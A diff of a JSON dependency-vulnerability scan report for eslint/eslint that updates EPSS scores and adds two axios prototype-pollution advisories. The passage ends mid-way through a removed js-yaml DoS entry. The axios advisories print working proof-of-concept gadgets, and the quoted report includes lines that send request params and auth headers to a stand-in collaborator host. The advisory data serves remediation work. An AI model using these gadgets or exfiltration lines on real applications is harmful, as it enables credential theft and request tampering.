@@ -1,6 +1,6 @@
 {
   "repo_path": "eslint/eslint",
-  "lockfile_path": "/private/var/folders/9m/0tn1pd9s6nb876xtbx9f94gc0000gp/T/arguss-observatory-psz2jn7d/package-lock.json",
+  "lockfile_path": "/private/var/folders/9m/0tn1pd9s6nb876xtbx9f94gc0000gp/T/arguss-observatory-hudsvd3x/package-lock.json",
   "entries": [
     {
       "finding": {
@@ -35,8 +35,8 @@
         ],
         "published_at": "2026-05-29",
         "cve_id": "CVE-2026-44492",
-        "epss_score": 0.00535,
-        "epss_percentile": 0.40885,
+        "epss_score": 0.00889,
+        "epss_percentile": 0.55376,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -76,8 +76,8 @@
           ],
           "published_at": "2026-05-29",
           "cve_id": "CVE-2026-44492",
-          "epss_score": 0.00535,
-          "epss_percentile": 0.40885,
+          "epss_score": 0.00889,
+          "epss_percentile": 0.55376,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -116,8 +116,8 @@
           ],
           "published_at": "2026-02-09",
           "cve_id": "CVE-2026-25639",
-          "epss_score": 0.01242,
-          "epss_percentile": 0.65367,
+          "epss_score": 0.025,
+          "epss_percentile": 0.82956,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -156,8 +156,8 @@
           ],
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42039",
-          "epss_score": 0.00413,
-          "epss_percentile": 0.32892,
+          "epss_score": 0.00717,
+          "epss_percentile": 0.49787,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -196,8 +196,8 @@
           ],
           "published_at": "2026-06-04",
           "cve_id": "CVE-2026-44496",
-          "epss_score": 0.00345,
-          "epss_percentile": 0.26191,
+          "epss_score": 0.00622,
+          "epss_percentile": 0.45913,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -236,8 +236,8 @@
           ],
           "published_at": "2026-06-04",
           "cve_id": "CVE-2026-44486",
-          "epss_score": 0.00322,
-          "epss_percentile": 0.23829,
+          "epss_score": 0.00532,
+          "epss_percentile": 0.41494,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -277,7 +277,7 @@
           "published_at": "2025-03-07",
           "cve_id": "CVE-2025-27152",
           "epss_score": 0.00759,
-          "epss_percentile": 0.50445,
+          "epss_percentile": 0.51231,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -316,8 +316,8 @@
           ],
           "published_at": "2026-06-04",
           "cve_id": "CVE-2026-44487",
-          "epss_score": 0.00385,
-          "epss_percentile": 0.3015,
+          "epss_score": 0.00664,
+          "epss_percentile": 0.47723,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -357,7 +357,7 @@
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42035",
           "epss_score": 0.00394,
-          "epss_percentile": 0.31113,
+          "epss_percentile": 0.31817,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -396,8 +396,8 @@
           ],
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42033",
-          "epss_score": 0.00381,
-          "epss_percentile": 0.29753,
+          "epss_score": 0.00808,
+          "epss_percentile": 0.5285,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -436,8 +436,8 @@
           ],
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42043",
-          "epss_score": 0.00409,
-          "epss_percentile": 0.32544,
+          "epss_score": 0.00661,
+          "epss_percentile": 0.47611,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -476,8 +476,8 @@
           ],
           "published_at": "2026-05-29",
           "cve_id": "CVE-2026-44495",
-          "epss_score": 0.00227,
-          "epss_percentile": 0.13154,
+          "epss_score": 0.00495,
+          "epss_percentile": 0.39261,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -517,7 +517,7 @@
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42038",
           "epss_score": 0.00301,
-          "epss_percentile": 0.21548,
+          "epss_percentile": 0.22145,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -557,7 +557,7 @@
           "published_at": "2023-11-08",
           "cve_id": "CVE-2023-45857",
           "epss_score": 0.00556,
-          "epss_percentile": 0.41993,
+          "epss_percentile": 0.42765,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -597,7 +597,7 @@
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42042",
           "epss_score": 0.00228,
-          "epss_percentile": 0.13341,
+          "epss_percentile": 0.13617,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -637,7 +637,7 @@
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42034",
           "epss_score": 0.00327,
-          "epss_percentile": 0.24346,
+          "epss_percentile": 0.2496,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -677,12 +677,92 @@
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42036",
           "epss_score": 0.00421,
-          "epss_percentile": 0.33634,
+          "epss_percentile": 0.34311,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
           "kev_known_ransomware": false,
           "finding_id": "3b725689a0b78a02"
+        },
+        {
+          "dependency": {
+            "name": "axios",
+            "version": "0.21.4",
+            "ecosystem": "npm",
+            "direct": false,
+            "path": [
+              "root",
+              "eslint-release",
+              "github-api",
+              "axios"
+            ],
+            "parents": [
+              "github-api"
+            ],
+            "install_key": "node_modules/axios"
+          },
+          "lens": "cve",
+          "severity": "medium",
+          "score": 50.0,
+          "cvss_score": 5.0,
+          "title": "GHSA-7q8q-rj6j-mhjq: Axios: Nested axios option objects can consume polluted prototype values",
+          "description": "## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth \u2014 lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth \u2014 lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads \u2014 lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic \u2026 headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>",
+          "remediation": "Upgrade axios from 0.21.4 to 0.33.0 or later",
+          "source_url": "https://osv.dev/vulnerability/GHSA-7q8q-rj6j-mhjq",
+          "advisory_id": "GHSA-7q8q-rj6j-mhjq",
+          "fixed_versions": [
+            "0.33.0",
+            "1.18.0"
+          ],
+          "published_at": "2026-07-20",
+          "cve_id": null,
+          "epss_score": null,
+          "epss_percentile": null,
+          "is_kev": false,
+          "kev_date_added": null,
+          "kev_due_date": null,
+          "kev_known_ransomware": false,
+          "finding_id": "dd74ad56f4b24dd6"
+        },
+        {
+          "dependency": {
+            "name": "axios",
+            "version": "0.21.4",
+            "ecosystem": "npm",
+            "direct": false,
+            "path": [
+              "root",
+              "eslint-release",
+              "github-api",
+              "axios"
+            ],
+            "parents": [
+              "github-api"
+            ],
+            "install_key": "node_modules/axios"
+          },
+          "lens": "cve",
+          "severity": "medium",
+          "score": 50.0,
+          "cvss_score": 5.0,
+          "title": "GHSA-mmx7-hfxf-jppx: Axios: Prototype pollution gadgets can alter axios request construction",
+          "description": "## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.\n\nFor direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.\n\n## Affected Functionality\n\nAffected normal API:\n\n- `axios.get(url[, config])`\n- `axios.delete(url[, config])`\n- `axios.head(url[, config])`\n- `axios.options(url[, config])`\n\nAffected low-level usage:\n\n- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.\n- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.\n\nUnaffected or corrected scope:\n\n- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.\n\n## Technical Details\n\n`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.\n\n`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.\n\nThe low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    res.writeHead(200, {'content-type': 'application/json'});\n    res.end(JSON.stringify({body, headers: req.headers}));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.data = 'INJECTED';\n\ntry {\n  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);\n\n  console.log(res.data.body); // \"INJECTED\"\n  console.log(res.data.headers['content-length']); // \"8\"\n} finally {\n  delete Object.prototype.data;\n  await new Promise(resolve => server.close(resolve));\n}\n```\n\nExpected result: a request body is sent even though the caller did not explicitly set `config.data`.\n\n## Workarounds\n\nAvoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nThree prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted `Object.prototype` to hijack outbound requests.\n\n### Details\n\nThe [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:\n\n`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.\n\n`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.\n\n`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.\n\nI read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.\n\n### PoC\n\nRan against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.\n\n```javascript\nimport axios from 'axios';\n\n// gadget 1 - proxy\nObject.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };\nawait axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });\n// check collaborator - request arrives with full path + auth header\n```\n\n```javascript\n// gadget 2 - data on bodyless methods\nObject.prototype.data = '{\"injected\":true}';\nawait axios.get('https://api.example.com/items');\nawait axios.delete('https://api.example.com/items/1');\nawait axios.head('https://api.example.com/items');\n// 3/4 methods send the polluted body\n```\n\n```javascript\n// gadget 3 - paramsSerializer\nObject.prototype.paramsSerializer = (p) => {\n  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));\n  return 'q=x';\n};\nawait axios.get('https://api.example.com/search', { params: { token: 'secret' } });\n```\n\n### Impact\n\nAny app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.\n</details>",
+          "remediation": "Upgrade axios from 0.21.4 to 0.33.0 or later",
+          "source_url": "https://osv.dev/vulnerability/GHSA-mmx7-hfxf-jppx",
+          "advisory_id": "GHSA-mmx7-hfxf-jppx",
+          "fixed_versions": [
+            "0.33.0",
+            "1.18.0"
+          ],
+          "published_at": "2026-07-20",
+          "cve_id": null,
+          "epss_score": null,
+          "epss_percentile": null,
+          "is_kev": false,
+          "kev_date_added": null,
+          "kev_due_date": null,
+          "kev_known_ransomware": false,
+          "finding_id": "02c01841a9b40ae7"
         },
         {
           "dependency": {
@@ -716,8 +796,8 @@
           ],
           "published_at": "2026-04-09",
           "cve_id": "CVE-2025-62718",
-          "epss_score": 0.01075,
-          "epss_percentile": 0.60616,
+          "epss_score": 0.01161,
+          "epss_percentile": 0.6372,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -757,7 +837,7 @@
           "published_at": "2026-05-29",
           "cve_id": "CVE-2026-44490",
           "epss_score": 0.00287,
-          "epss_percentile": 0.20248,
+          "epss_percentile": 0.20786,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -796,8 +876,8 @@
           ],
           "published_at": "2026-04-10",
           "cve_id": "CVE-2026-40175",
-          "epss_score": 0.00933,
-          "epss_percentile": 0.56059,
+          "epss_score": 0.01815,
+          "epss_percentile": 0.76317,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -836,8 +916,8 @@
           ],
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42041",
-          "epss_score": 0.00289,
-          "epss_percentile": 0.20389,
+          "epss_score": 0.00611,
+          "epss_percentile": 0.4534,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -877,7 +957,7 @@
           "published_at": "2026-05-05",
           "cve_id": "CVE-2026-42040",
           "epss_score": 0.00217,
-          "epss_percentile": 0.11928,
+          "epss_percentile": 0.12192,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -888,9 +968,10 @@
       "candidate": {
         "package": "axios",
         "from_version": "0.21.4",
-        "to_version": "0.32.0",
+        "to_version": "0.33.0",
         "fix_kind": "minor",
         "source_finding_ids": [
+          "02c01841a9b40ae7",
           "0ed2701093142cf8",
           "2ed981a55440532a",
           "3b725689a0b78a02",
@@ -910,18 +991,19 @@
           "b9e39b63ff45fb0b",
           "c2d73f6e77eef6b2",
           "d193530a4fa0eb5e",
+          "dd74ad56f4b24dd6",
           "e80b9ad334cae860",
           "f2a0986868a31e96"
         ],
         "repo_id": "eslint/eslint",
         "trust_subscore": 0,
-        "max_epss_score": 0.01242,
-        "max_epss_percentile": 0.65367,
+        "max_epss_score": 0.025,
+        "max_epss_percentile": 0.82956,
         "has_kev_finding": false,
-        "candidate_id": "3dcdde8aefb71b50"
+        "candidate_id": "cd24d099957f01d8"
       },
       "verdict": {
-        "candidate_id": "3dcdde8aefb71b50",
+        "candidate_id": "cd24d099957f01d8",
         "tier": "review_required",
         "score": 85,
         "reasons": [
@@ -930,7 +1012,7 @@
         "veto_signals": [
           "trust.ownership_transferred"
         ],
-        "evaluated_at": "2026-06-24T06:42:03.813073+00:00",
+        "evaluated_at": "2026-07-21T17:19:16.175761+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -968,7 +1050,7 @@
         "published_at": "2024-11-08",
         "cve_id": "CVE-2024-21538",
         "epss_score": 0.00873,
-        "epss_percentile": 0.542,
+        "epss_percentile": 0.54958,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -1009,7 +1091,7 @@
           "published_at": "2024-11-08",
           "cve_id": "CVE-2024-21538",
           "epss_score": 0.00873,
-          "epss_percentile": 0.542,
+          "epss_percentile": 0.54958,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1028,7 +1110,7 @@
         "repo_id": "eslint/eslint",
         "trust_subscore": 30,
         "max_epss_score": 0.00873,
-        "max_epss_percentile": 0.542,
+        "max_epss_percentile": 0.54958,
         "has_kev_finding": false,
         "candidate_id": "540a064f0bebe531"
       },
@@ -1042,7 +1124,7 @@
         "veto_signals": [
           "fix_kind.major"
         ],
-        "evaluated_at": "2026-06-24T06:42:03.870535+00:00",
+        "evaluated_at": "2026-07-21T17:19:16.235990+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -1080,8 +1162,8 @@
         ],
         "published_at": "2026-01-14",
         "cve_id": "CVE-2026-24001",
-        "epss_score": 0.00512,
-        "epss_percentile": 0.39551,
+        "epss_score": 0.00562,
+        "epss_percentile": 0.43092,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -1122,8 +1204,8 @@
           ],
           "published_at": "2026-01-14",
           "cve_id": "CVE-2026-24001",
-          "epss_score": 0.00512,
-          "epss_percentile": 0.39551,
+          "epss_score": 0.00562,
+          "epss_percentile": 0.43092,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1141,8 +1223,8 @@
         ],
         "repo_id": "eslint/eslint",
         "trust_subscore": 0,
-        "max_epss_score": 0.00512,
-        "max_epss_percentile": 0.39551,
+        "max_epss_score": 0.00562,
+        "max_epss_percentile": 0.43092,
         "has_kev_finding": false,
         "candidate_id": "60f49c8094941b8c"
       },
@@ -1156,115 +1238,7 @@
         "veto_signals": [
           "fix_kind.major"
         ],
-        "evaluated_at": "2026-06-24T06:42:03.927528+00:00",
-        "engine_version": "fix-confidence-v1.0.0"
-      }
-    },
-    {
-      "finding": {
-        "dependency": {
-          "name": "js-yaml",
-          "version": "3.14.2",
-          "ecosystem": "npm",
-          "direct": false,
-          "path": [
-            "root",
-            "gray-matter",
-            "js-yaml"
-          ],
-          "parents": [
-            "gray-matter"
-          ],
-          "install_key": "node_modules/gray-matter/node_modules/js-yaml"
-        },
-        "lens": "cve",
-        "severity": "medium",
-        "score": 53.0,
-        "cvss_score": 5.3,
-        "title": "GHSA-h67p-54hq-rp68: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases",
-        "description": "### Summary\nA crafted YAML document can trigger algorithmic CPU exhaustion in `js-yaml` merge-key processing (`<<`) by repeating the same alias many times in a merge sequence.  \nThis causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.\n\n### Details\nThe issue is in merge handling inside `lib/loader.js`:\n\n- `storeMappingPair(...)` iterates every element of a merge sequence when key tag is `tag:yaml.org,2002:merge`.\n- For each element, it calls `mergeMappings(...)`.\n- `mergeMappings(...)` computes `Object.keys(source)` and performs `_hasOwnProperty.call(destination, key)` checks for each key.\n\nWhen input is of the form:\n\na: &a {k0:0, k1:0, ..., kK:0}\nb: {<<: [*a, *a, *a, ... repeated M times ...]}\nall *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.\nResulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.\nRelevant code path:\nlib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')\nlib/loader.js mergeMappings(...)\n\n\n### Root cause\nFile:       lib/loader.js\nFunction:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,\n                             valueNode, startLine, startLineStart, startPos)\nLines:      ~359-366\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        for (index = 0, quantity = valueNode.length; index < quantity; index += 1) {\n          mergeMappings(state, _result, valueNode[index], overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }\n\nWhen the merge value is a sequence (YAML 1.1 <<: [ *a, *a, ... ]), each element\nis handed to mergeMappings() without deduplication. mergeMappings() then does\n\n    sourceKeys = Object.keys(source);\n    for (index = 0; index < sourceKeys.length; index += 1) {\n      key = sourceKeys[index];\n      if (!_hasOwnProperty.call(destination, key)) {\n        setProperty(destination, key, 